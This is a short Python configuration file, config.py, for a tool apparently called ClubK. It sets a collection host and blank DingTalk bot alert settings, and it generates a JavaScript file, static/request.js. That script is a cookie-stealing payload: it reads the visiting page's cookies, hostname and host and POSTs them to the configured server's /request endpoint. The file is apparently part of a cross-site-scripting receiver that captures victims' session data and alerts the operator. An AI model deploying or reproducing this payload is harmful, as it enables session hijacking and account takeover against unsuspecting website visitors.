# -*- coding: UTF-8 -*-
# @Project ：ClubK
# @File    ：config.py
# Author   ：0xsdeo
# Date     ：2024/9/28 01:28

HOST = "http://127.0.0.1:5000"

pem = r'ssl/'
key = r'ssl/'

dingtalk_bot_Webhook = ""
dingtalk_bot_secret = ""

js = """(function () {
    let a = {
        cookie: document.cookie,
        hostname : window.location.hostname,
        host : window.location.host
    }

    let xhr = new XMLHttpRequest;
    xhr.open("post", \"""" + HOST + "/request" + """\");
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(a))
})()"""

with open("static/request.js","w") as _:
    _.write(js)